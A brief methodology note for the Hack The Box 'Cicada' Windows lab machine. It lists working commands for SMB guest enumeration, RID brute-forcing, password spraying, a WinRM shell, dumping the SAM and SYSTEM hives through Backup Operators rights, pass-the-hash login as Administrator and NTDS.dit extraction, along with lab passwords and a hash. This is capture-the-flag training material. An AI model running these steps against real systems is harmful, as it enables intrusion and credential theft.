https://0xdf.gitlab.io/2025/02/15/htb-cicada.html
Windows

# Methodology

Initial Foothold:
- Nmap
- SMB try user "guest" with empty pw: `netexec smb CICADA-DC -u guest -p '' --shares` => works
- connect to SMB share `smbclient -N //10.10.11.35/HR` => file with password
- brute-force RIDs to get usernames: `netexec smb CICADA-DC -u guest -p '' --rid-brute`
- Spray the previously discovered password on these usernames: `netexec smb CICADA-DC -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success` => works for 1 user
- Enumerate users via LDAP: `netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users` => A users description contains his password
- New user can access another SMB share: `netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares`
- Share contains a file with password
- Check if password works for WinRM: `netexec winrm CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'` => yes
- Get shell: `evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`

PrivEsc:
- Check user groups: `net user emily.oscars
- user is in the Backup Operators group =>
- dump SAM and hive: `reg save hklm\sam sam`, `reg save hklm\system system`, `download sam`, `download system`
- Retrieve hashes: `secretsdump.py -sam sam -system system LOCAL`
- Get a shell as Administrator via hash: `evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341`
- Retrieve NTDS.dit hashes: `netexec smb 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -M ntdsutil`